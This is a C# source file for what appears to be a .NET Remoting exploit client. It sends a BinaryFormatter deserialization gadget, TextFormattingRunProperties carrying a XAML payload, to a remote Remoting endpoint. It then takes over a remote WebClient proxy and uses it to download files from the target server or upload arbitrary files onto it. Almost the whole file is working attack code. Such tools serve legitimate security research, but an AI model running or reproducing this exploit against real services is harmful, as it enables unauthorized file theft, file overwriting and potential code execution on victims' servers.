using System;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Remoting;
using System.IO;
using System.Net;
using System.Runtime.Serialization;
using System.Reflection;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Collections;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using CodeWhite.Remoting.Shared;
using System.Collections.Generic;

namespace CodeWhite.Remoting.RemotingClient_MBRO
{
    internal class Program
    {
        static readonly string ASSEMBLY_LOCATION = Assembly.GetExecutingAssembly().Location;
        static readonly string XAML_PAYLOAD_FILE = "WebClient.xaml.xml";

        internal static void Main(string[] args)
        {

            if (args.Length < 2)
            {
                Console.Error.WriteLine($"usage: {Path.GetFileName(ASSEMBLY_LOCATION)} objUrl fileUrl uploadFilePath backupFlag");
                Console.Error.WriteLine();
                Console.Error.WriteLine("example:");
                Console.Error.WriteLine($@"  {Path.GetFileName(ASSEMBLY_LOCATION)} tcp://127.0.0.1:12345/DummyService C:\Windows\win.ini C:\temp\myfile.txt true");
                Console.Error.WriteLine("backupFlag: true/false - whether to backup the target file first");
                Environment.Exit(-1);
            }


            bool shouldDownload = false;
            string uploadFilePath = string.Empty;
            if (args.Length == 2)
            {
                shouldDownload = true;
            }
            else
            {
                uploadFilePath = args[2];
                if (args.Length > 3)
                {
                    shouldDownload = bool.Parse(args[3]);
                }
            }

            Uri objUrl = new Uri(args[0]);
            Uri fileUrl = new Uri(args[1]);

            RemotingConfiguration.Configure($"{Assembly.GetExecutingAssembly().Location}.config");

            // prepare custom tcp client channel
            var properties = new Hashtable();
            var sinkProvider = new CustomClientChannelSinkProvider();
            var clientChannel = new TcpClientChannel(properties, sinkProvider);
            ChannelServices.RegisterChannel(clientChannel, false);

            // prepare and send XAML gadget
            object payload = new TextFormattingRunPropertiesMarshal(File.ReadAllText(XAML_PAYLOAD_FILE));
            const string key = "MBRO";
            var logicalCallContextData = new Dictionary<string, object>()
            {
                { key, payload }
            };
            IMethodReturnMessage methodReturnMessage = Utils.CallRemoteToStringMethod(objUrl, logicalCallContextData);

            // obtain proxy from `Exception.Data`
            var exception = methodReturnMessage.Exception;
            while (exception.InnerException != null)
                exception = exception.InnerException;
            var mbro = (MarshalByRefObject)((object[])exception.Data[key])[0];

            // print info
            Utils.PrintInfo(mbro);

            // use remote `WebClient`
            WebClient remoteWebClient = (WebClient)mbro;
            
            // Download file to local directory with base filename from target URL
            string baseFileName = Path.GetFileName(fileUrl.LocalPath);
            if (string.IsNullOrEmpty(baseFileName))
            {
                baseFileName = "downloaded_file";
            }
            string tempFilePath = Path.Combine(Directory.GetCurrentDirectory(), baseFileName);

            if (shouldDownload)
            {
                try
                {
                    Console.WriteLine($"Downloading {fileUrl} to local file {tempFilePath}");
                    byte[] downloadedData = remoteWebClient.DownloadData(fileUrl);
                    File.WriteAllBytes(tempFilePath, downloadedData);
                    Console.WriteLine("Download completed");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Download failed: {ex.Message}");
                    Console.WriteLine($"Exception Type: {ex.GetType().Name}");
                    Console.WriteLine($"Stack Trace: {ex.StackTrace}");
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine($"Inner Exception: {ex.InnerException.Message}");
                    }
                    Console.WriteLine("Proceeding with upload...");
                }
            }
            else
            {
                Console.WriteLine("Skipping backup (backup flag is false)");
            }

            
            if (uploadFilePath.Length > 0)
            {

                // If uploadFilePath is just a filename (no directory), resolve to current directory
                if (!Path.IsPathRooted(uploadFilePath) && !uploadFilePath.Contains(Path.DirectorySeparatorChar) && !uploadFilePath.Contains(Path.AltDirectorySeparatorChar))
                {
                    uploadFilePath = Path.Combine(Directory.GetCurrentDirectory(), uploadFilePath);
                }

                // Upload the specified file
                Console.WriteLine($"Uploading {uploadFilePath} to {fileUrl}");
                byte[] fileData = File.ReadAllBytes(uploadFilePath);
                remoteWebClient.UploadData(fileUrl, fileData);
                Console.WriteLine("Upload completed");   
            
            }
        

        }
    }

    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        string _xaml;
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            this._xaml = xaml;
        }
        void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties));
            info.AddValue("ForegroundBrush", this._xaml);
        }
    }

    public class CustomClientChannelSinkProvider : IClientChannelSinkProvider
    {
        IClientChannelSinkProvider _next;
        public CustomClientChannelSinkProvider() { }

        public IClientChannelSinkProvider Next { get => _next; set => _next = value; }

        public IClientChannelSink CreateSink(IChannelSender channel, string url, object remoteChannelData)
        {
            IClientChannelSink clientChannelSink = null;
            if (this.Next != null)
            {
                clientChannelSink = this.Next.CreateSink(channel, url, remoteChannelData);
                if (clientChannelSink == null)
                {
                    return null;
                }
            }
            return new CustomBinaryClientFormatterSink(clientChannelSink);
        }
    }

    public class CustomBinaryClientFormatterSink : IClientFormatterSink
    {
        private readonly IClientChannelSink _nextSink;

        public CustomBinaryClientFormatterSink(IClientChannelSink nextSink)
        {
            this._nextSink = nextSink;
        }

        public IMessageSink NextSink => throw new NotImplementedException();

        public IClientChannelSink NextChannelSink => throw new NotImplementedException();

        public IDictionary Properties => throw new NotImplementedException();

        public IMessageCtrl AsyncProcessMessage(IMessage msg, IMessageSink replySink)
        {
            throw new NotImplementedException();
        }

        public void AsyncProcessRequest(IClientChannelSinkStack sinkStack, IMessage msg, ITransportHeaders headers, Stream stream)
        {
            throw new NotImplementedException();
        }

        public void AsyncProcessResponse(IClientResponseChannelSinkStack sinkStack, object state, ITransportHeaders headers, Stream stream)
        {
            throw new NotImplementedException();
        }

        public Stream GetRequestStream(IMessage msg, ITransportHeaders headers)
        {
            throw new NotImplementedException();
        }

        public void ProcessMessage(IMessage msg, ITransportHeaders requestHeaders, Stream requestStream, out ITransportHeaders responseHeaders, out Stream responseStream)
        {
            throw new NotImplementedException();
        }

        public IMessage SyncProcessMessage(IMessage msg)
        {
            IMethodCallMessage mcm = msg as IMethodCallMessage;
            IMessage result;
            try
            {
                ITransportHeaders requestHeaders;
                Stream requestStream;
                this.SerializeMessage(msg, out requestHeaders, out requestStream);
                // Add Authentication Key header
                requestHeaders["AuthenticationKey"] = "";
                ITransportHeaders transportHeaders;
                Stream stream;
                this._nextSink.ProcessMessage(msg, requestHeaders, requestStream, out transportHeaders, out stream);
                if (transportHeaders == null)
                {
                    throw new ArgumentNullException("returnHeaders");
                }
                result = this.DeserializeMessage(mcm, transportHeaders, stream);
            }
            catch (Exception e)
            {
                result = new ReturnMessage(e, mcm);
            }
            return result;
        }

        private IMessage DeserializeMessage(IMethodCallMessage mcm, ITransportHeaders transportHeaders, Stream stream)
        {
            BinaryFormatter binaryFormatter = new BinaryFormatter()
            {
                Context = new StreamingContext(StreamingContextStates.Other),
            };
            return (IMessage)binaryFormatter.Deserialize(stream);
        }

        private void SerializeMessage(IMessage msg, out ITransportHeaders headers, out Stream stream)
        {
            if (msg is IMethodCallMessage)
            {
                msg = new MethodCallMarshal((IMethodCallMessage)msg);
            }
            ITransportHeaders transportHeaders = new TransportHeaders();
            headers = transportHeaders;
            transportHeaders["Content-Type"] = "application/octet-stream";
            stream = new MemoryStream();
            BinaryFormatter binaryFormatter = new BinaryFormatter()
            {
                SurrogateSelector = (ISurrogateSelector)Activator.CreateInstance(typeof(RemotingSurrogateSelector)),
                Context = new StreamingContext(StreamingContextStates.Other),
            };
            binaryFormatter.Serialize(stream, msg);
            stream.Position = 0;
        }
    }

    [Serializable]
    public class MethodCallMarshal : IMessage, ISerializable
    {
        private readonly IMethodCallMessage _methodCall;

        public MethodCallMarshal(IMethodCallMessage methodCall)
        {
            this._methodCall = methodCall;
        }

        public IDictionary Properties => _methodCall.Properties;

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(MethodCall));
            info.AddValue("__Uri", _methodCall.Uri);
            info.AddValue("__MethodName", _methodCall.MethodName);
            info.AddValue("__MethodSignature", _methodCall.MethodBase.GetParameters().Select(p => p.ParameterType).ToArray());
            info.AddValue("__Args", _methodCall.Args);
            info.AddValue("__TypeName", _methodCall.MethodBase.DeclaringType.AssemblyQualifiedName);
            info.AddValue("__CallContext", _methodCall.LogicalCallContext);
        }
    }
}
